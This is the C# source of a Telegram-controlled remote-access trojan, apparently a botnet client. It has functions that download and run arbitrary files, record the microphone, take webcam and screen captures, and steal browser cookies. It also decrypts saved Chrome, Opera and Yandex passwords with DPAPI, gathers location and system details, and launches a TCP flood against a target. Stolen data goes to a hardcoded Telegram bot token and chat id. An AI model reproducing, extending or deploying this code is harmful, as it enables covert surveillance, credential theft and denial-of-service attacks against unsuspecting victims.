using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Management;
using Microsoft.VisualBasic.Devices;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Text;
using System.Data.SQLite;
using System.Data;
using NAudio.Wave;
using SimpleJSON;
using Emgu.CV;
using Captura;

namespace Botnet
{
    class Functions
    {
        TelegramSystem ts;

        public Functions(TelegramSystem ts)
        {
            this.ts = ts;
        }

        [DllImport("winmm.dll")]
        private static extern long mciSendString(string command, StringBuilder retstring, int Returnlenght, IntPtr callback);
        public void OpenLink(string URI)
        {
            if (URI.StartsWith("http"))
            {
                Thread thr = new Thread(() => { Process.Start(URI); });
                thr.Start();
            }
        }

        public void DownloadExecute(string URI)
        {
            Thread thr = new Thread(() =>
            {
                string filePath = DownloadFileFromInternet(URI);
                Process.Start(filePath);
            });
            thr.Start();
        }

        public void GetGPSLocation()
        {
            string mac;
            GetMacAddress(out mac);
            string response = DownloadString(request: "https://api.mylnikov.org/geolocation/wifi?bssid=" + mac + "&v=1.1");
            if(!string.IsNullOrEmpty(response) && !string.IsNullOrWhiteSpace(response))
            {
                var json = JSON.Parse(response);
                string lat = json["data"]["lat"].ToString().Replace("\"", "");
                string lon = json["data"]["lon"].ToString().Replace("\"", "");

                try
                {
                    using (WebClient webClient = new WebClient())
                        webClient.DownloadString($"https://api.telegram.org/bot757379845:AAGS_av1RT99Kf9BzyALTol6FzLyywIqe0U/sendlocation?chat_id=454529803&latitude={lat}&longitude={lon}");
                }
                catch(Exception ex)
                {
                    ts.SendMessage($"[ERROR] {ex.Message}");
                }
            }
            else
                ts.SendMessage($"[ERROR]");
        }

        static WaveFileWriter waveFile;

        public void RecordAudio(string time = "5")
        {
            int delay;
            if (!int.TryParse(time, out delay))
                ts.SendMessage("[RecordAudio ERROR] Write correct seconds.");
            else
            {
                delay += 1;
                string path = config.appData + "\\BotFiles\\waveS.wav";
                try
                {
                    WaveInEvent waveSource = new WaveInEvent();
                    //waveSource.DeviceNumber = 0;
                    waveSource.WaveFormat = new WaveFormat(44100, 1);

                    waveSource.DataAvailable += new EventHandler<WaveInEventArgs>(waveSource_DataAvailable);

                    string tempFile = path;
                    waveFile = new WaveFileWriter(tempFile, waveSource.WaveFormat);
                    waveSource.StartRecording();
                    Thread.Sleep(delay * 1000);
                    try
                    {
                        waveSource.StopRecording();
                        waveFile.Dispose();
                        ts.SendDocument(path, $"[RecordAudio {GetIp()}]");
                    }
                    catch (Exception ex) { ts.SendMessage($"[RecordAudio ERROR] {ex.Message}"); }
                }
                catch (Exception ex)
                {
                    ts.SendMessage($"[RecordSound ERROR] {ex.Message}");
                }
            }
        }

        static void waveSource_DataAvailable(object sender, WaveInEventArgs e)
        {
            waveFile.Write(e.Buffer, 0, e.BytesRecorded);
        }

        public string ZipFile(string path)
        {
            string pathToSave = config.appData + $"\\BotFiles\\{Path.GetFileNameWithoutExtension(path)}" + ".zip";
            try
            {
                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
                {
                    DirectoryInfo di = new DirectoryInfo(path);
                    zip.AddFile(path);
                    zip.Save(pathToSave);
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[ZipFile ERROR] {ex.Message}");
            }
            return pathToSave;
        }

        public string ZipFolder(string folder)
        {
            string pathToSave = config.appData + "\\BotFiles";
            try
            {
                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
                {
                    DirectoryInfo di = new DirectoryInfo(folder);
                    pathToSave += "\\" + di.Name + ".zip";
                    zip.AddDirectory(folder);
                    zip.Save(pathToSave);
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[ZipFolder ERROR] {ex.Message}");
            }
            return pathToSave;
        }

        public void SendCommands()
        {
            string response = 
                "/open_link|<link> - open some link in browser\n" +
                "/download_execute|<link> - download and instant open file\n" +
                "/exit - close bot\n/ddos|<ip>|<threads> - in developing" +
                "\n/GetCookieFile - get cookies from browsers\n" +
                "/GetSystem - get system specs\n" +
                "/GetProcess - get tasklist\n" +
                "/GetGPSLocation - get gps location of bot (doesnt work)" +
                "/KillProcess|<process name> - kill process\n" +
                "/ls|<path> - get files and folders in <path>\n" +
                "To upload update you need to attach update\n " +
                "with caption \"/UploadUpdate\" \n" +
                "To upload file and open it you need to attach file\n " +
                "with caption \"/UploadExecute\"\n" +
                "/DownloadFile|<full path to file> - download file\n" +
                "/DownloadFolder|<full path to folder> - download files from folder in zip archive\n" +
                "/SnapShotCam - get snapshot\n/TakeScreenShot - take screenshot\n" +
                "/CaptureMonitor|<video time> - capture video from monitor\n" +
                "/GetGooglePasswords - get passwords from google\n" +
                "/RecordAudio|<time in secs (5 is default)>\n" +
                "/MessageBox|<message>|<caption> - show message box\n" +
                "/OpenFile|<full path to file> - open file\n" +
                "If you wonna just send a file without execute you can simply send this file without any caption\n" +
                "If you are sending audio, photo or video file send it like a file/help - get command list";
            ts.SendMessage(response);
        }

        public void SnapShotCam()
        {
            using (var capture = new VideoCapture())
            {
                Bitmap image = capture.QueryFrame().Bitmap; //take a picture
                image.Save(config.appData + "\\BotFiles\\webcam.png", ImageFormat.Png);
            }
            ts.SendDocument(config.appData + "\\BotFiles\\webcam.png", "[ScreenShot] Screenshot like document.");
        }

        public void CaptureScreen(int delay)
        {
            var recorder = new Recorder(new RecorderParams(config.appData + "\\BotFiles\\capturescreen.avi", 24, SharpAvi.KnownFourCCs.Codecs.MotionJpeg, 70));
            Thread.Sleep(delay * 1000);
            recorder.Dispose();
            string path = ZipFile(config.appData + "\\BotFiles\\capturescreen.avi");
            ts.SendDocument(path, "[CaptureScreen] Video from screen");
        }

        public void GetCookieAndLoginData()
        {
            string directory = config.appData + "\\Bot";
            Directory.CreateDirectory(directory);
            KillBrowsers();
            string username = Environment.UserName;
            string[] pathes = {
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Cookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\INetCookies",
                $"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\Cookies" };

            int counter = 0;
            foreach (var path in pathes)
            {
                Console.WriteLine(path);
                Console.WriteLine(File.Exists(path));
                if (File.Exists(path))
                {
                    Console.WriteLine(File.Exists(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}"));
                    if(File.Exists(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}"))
                    {
                        File.Delete(directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                        File.Copy(path, directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                    }
                    else
                        File.Copy(path, directory + "\\" + Path.GetFileNameWithoutExtension(path) + $" {config.browsers[counter]}");
                }

                counter++;
            }
            string folder = ZipFolder(directory);
            ts.SendDocument(folder, $"[COOKIES] Got {counter} cookies [{GetIp()}]");
        }

        public void DownloadFolder(string path)
        {
            string zip = ZipFolder(path);
            ts.SendDocument(zip);
        }

        public string GetLocalIp()
        {
                string localIP;
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    localIP = endPoint.Address.ToString();
                }
                return localIP;
        }

        public void GetSystem()
        {
            string name = string.Empty;
            string VideoProc = string.Empty;
            string Capacity = string.Empty;
            string procName = string.Empty;
            string mac = string.Empty;
            string response = string.Empty;
            string SysVer = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion", "ProductName", null);
            GetMacAddress(out mac);
            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
            foreach (ManagementObject queryObj in searcher2.Get())
            {
                name = queryObj["Caption"].ToString();
                VideoProc = string.Format("Семейство: {0}", queryObj["VideoProcessor"]);
                Capacity = string.Format("Обьем: {0}", queryObj["AdapterRAM"]);
            }

            ManagementObjectSearcher mos =
              new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                procName = mo["Name"].ToString();
            }
            ComputerInfo CI = new ComputerInfo();
            ulong mem = ulong.Parse(CI.TotalPhysicalMemory.ToString());
            string ram = Math.Round(Convert.ToDouble(mem / (1024 * 1024) / 1000), 0).ToString();
            response += $"System [{GetIp()}] \n";
            response += "User name: " + Environment.UserName + "\n";
            response += ("OS Version: " + SysVer + "\n");
            if (cMain.Is64Bit())
                response += ("OS Аrchitecture: 64bit\n");
            else
                response += ("OS Аrchitecture: 32bit");
            response += ("Local drives: ");
            foreach(var loc in Environment.GetLogicalDrives())
            {
                response += (loc + " ");
            }
            response += ("\n");
            response += ("Core count: " + Environment.ProcessorCount + "\n");
            response += ("Processor name: " + procName + "\n");
            response += ("Video card: " + name + "\n");
            response += ("RAM: " + ram + " GB\n");
            response += ("\n");
            response += ("Local IP: " + GetLocalIp() + "\n");
            response += ("IP: " + GetIp() + "\n");
            response += ("MAC: " + mac + "\n");
            ts.SendMessage(response);
        }

        public void GetFiles(string path)
        {
            string response = $"Files and directories [{GetIp()}] [{Directory.GetCurrentDirectory()}]: \n";
            try
            {
                DirectoryInfo dir = new DirectoryInfo(path);
                foreach (var item in dir.GetDirectories())
                {
                    response += item.Name + "\n";
                }
                foreach (var item in dir.GetFiles())
                {
                    response += item.Name + "\n";
                }

                ts.SendMessage(response);
            }
            catch (Exception ex) { ts.SendMessage($"[ERROR] [{GetIp()}] {ex.Message}"); }
        }

        public void GetProcess()
        {
            string response = $"Task list {GetIp()}\n";
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach(var process in processes)
            {
                response += ("ID: " + process.Id + " Name: " + process.ProcessName.ToLower() + "\n");
            }
            ts.SendMessage(response);
        }

        public string DownloadFileFromInternet(string URI)
        {
            string file_name = Path.GetFileName(URI);
            string temp_path = Path.GetTempPath();

            string file_path = Path.Combine(temp_path, file_name);

            WebClient wc = new WebClient();
            wc.Proxy = null;

            wc.DownloadFile(URI, file_path);
            return file_path;
        }


        public string DownloadString(string request)
        {
            try
            {
                using (var webClient = new WebClient())
                {
                    string response = webClient.DownloadString(request);
                    return response;
                }
            }
            catch (Exception ex)
            {
                ts.SendMessage($"ERROR: {ex.Message}");
            }

            return string.Empty;
        }

        public void DownloadFile(string path)
        {
            if (File.Exists(path))
                ts.SendDocument(path, $"DownloadFile [{GetIp()}]");
            else
                ts.SendMessage($"[File downloader] File doesn't exists.");
        }

        public void TakeScreenShot()
        {
            Graphics gr;

            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            gr = Graphics.FromImage(bmp);
            gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(config.appData + "\\BotFiles\\screen.png", ImageFormat.Png);
            ts.SendDocument(config.appData + "\\BotFiles\\screen.png", "[ScreenShot] Screenshot like document.");
        }

        public void GetGooglePasswords()
        {
            string username = Environment.UserName;
            string[] pathes = { $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data",
                $"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"};
            KillBrowsers();
            try
            {
                int counter = 0;
                foreach (var db_way in pathes)
                {
                    if (File.Exists(db_way))
                    {
                        Directory.CreateDirectory($"{config.appData}\\BotFiles\\passes");
                        string filename = $"{config.appData}\\BotFiles\\passes\\pass {config.passes[counter]}.txt";
                        StreamWriter Writer = new StreamWriter(filename, false, Encoding.UTF8);
                        string db_field = "logins";
                        byte[] entropy = null;
                        string description;

                        string ConnectionString = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
                        DataTable DB = new DataTable();
                        string sql = string.Format("SELECT * FROM {0} {1} {2}", db_field, "", "");
                        using (SQLiteConnection connect = new SQLiteConnection(ConnectionString))
                        {
                            SQLiteCommand command = new SQLiteCommand(sql, connect);
                            SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                            adapter.Fill(DB);
                            int rows = DB.Rows.Count;
                            for (int i = 0; i < rows; i++)
                            {
                                byte[] byteArray = (byte[])DB.Rows[i][5];
                                byte[] decrypted;
                                try
                                {
                                    decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                                }
                                catch (Exception ex)
                                {
                                    continue;
                                }
                                string password = new UTF8Encoding(true).GetString(decrypted);
                                if (password == string.Empty && DB.Rows[i][3].ToString().Trim() == string.Empty)
                                {
                                    continue;
                                }
                                else
                                {
                                    Writer.Write(i + 1 + ") "); // Here we print order number of our trinity "site-login-password"
                                    Writer.WriteLine($"URL: [{DB.Rows[i][1]}]"); // site URL
                                    Writer.WriteLine($"Login: [{DB.Rows[i][3]}]"); // login
                                    Writer.WriteLine($"Password: [{password}]");
                                    Writer.WriteLine();
                                }
                            }
                            Writer.Close();
                        }
                    }
                    counter++;
                }
                string folder = ZipFolder($"{config.appData}\\BotFiles\\passes");
                ts.SendDocument(folder, "[Passwords] Well done!");
            }
            catch (Exception ex)
            {
                ts.SendMessage($"[Passwords] {ex.Message}");
            }
        }

        public void ShowMessageBox(string message, string caption = "Message")
        {
            MessageBox.Show(message, caption, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void KillProcess(string processID)  //  Закрытие процесса и отправка подтверждения
        {
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                if (process.ProcessName.ToLower() == processID.ToLower())
                {
                    ts.SendMessage($"[Process killer] Process [{processID}] has been killed!");
                    process.Kill();
                }
            }
        }

        public void KillBrowsers()  // Закрытие браузеров
        {
            Process prc = new Process();
            Process[] processes = Process.GetProcesses();
            foreach (var process in processes)
            {
                if (process.ProcessName.ToLower().Contains("chrome") || process.ProcessName.ToLower().Contains("opera") || process.ProcessName.ToLower().Contains("browser"))
                    process.Kill();
            }
            Thread.Sleep(500);
        }

        public static string GetIp()
        {
            var request = WebRequest.Create("http://checkip.dyndns.org");
            string reqstring;

            using (var reader = new StreamReader(request.GetResponse().GetResponseStream()))
            {
                reqstring = reader.ReadToEnd();
            }

            string[] a = reqstring.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string ip = a3[0];

            return ip;
        }

        public static WebProxy GetProxy()
        {
            var httpProxy = new WebProxy("161.35.139.101:8080");
            return httpProxy;
        }

        public static IPAddress DoGetHostAddresses(string hostname)
        {
            IPAddress[] ips;
            ips = Dns.GetHostAddresses(hostname);
            return ips[0];
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);
        // Получаем MAC Адресс
        public static string ConvertIpToMAC(IPAddress ip)
        {
            byte[] ab = new byte[6];
            int len = ab.Length;
            int r = SendARP(ip.GetHashCode(), 0, ab, ref len);
            return BitConverter.ToString(ab, 0, 6);
        }

        public void GetMacAddress(out string Mac)
        {
            Mac = "SMTHNG";
            try
            {
                ManagementObjectSearcher NetworkSearcher = new ManagementObjectSearcher("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration");
                foreach (ManagementObject NetworkObj in NetworkSearcher.Get())
                {
                    string[] router = (string[])(NetworkObj["DefaultIPGateway"]);
                    if (router != null)
                    {
                        Mac = ConvertIpToMAC(IPAddress.Parse(router[0]));
                    }
                }
            }
            catch (Exception ex)
            {
                Mac = $"Error: {ex.Message}";
            }
        }

        public void DDOS(string URI, int thread)
        {
            Thread thr = new Thread(() =>
            {
                Console.WriteLine("Thread started");
                string target = URI;
                int port = 80;
                int threads = thread;

                for (int i = 0; i < threads; i++)
                {
                    Console.WriteLine("For started");
                    new Thread(() =>
                    {
                        Console.WriteLine("Thread");
                        Thread.CurrentThread.IsBackground = true;
                        while (true)
                        {
                            Console.WriteLine("smthng");
                            try
                            {
                                Console.WriteLine("Start");
                                TcpClient client = new TcpClient();
                                client.NoDelay = true;
                                client.Connect(target, port);
                                Console.WriteLine("Connected");
                                StreamWriter stream = new StreamWriter(client.GetStream());
                                stream.AutoFlush = true;
                                stream.Write("POST / HTTP/1.1\r\nHost: " + target + "\r\nConnect-length: 5000\r\n\r\n");
                                StreamReader reader = new StreamReader(client.GetStream());
                                Console.WriteLine(reader.ReadToEnd());
                                client.Close();
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                        }
                    }).Start();
                }
                while (true) ;
            });

            thr.Start();
        }

        private bool testSite(string url)
        {
            Uri uri = new Uri(url);
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)HttpWebRequest.Create(uri);
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
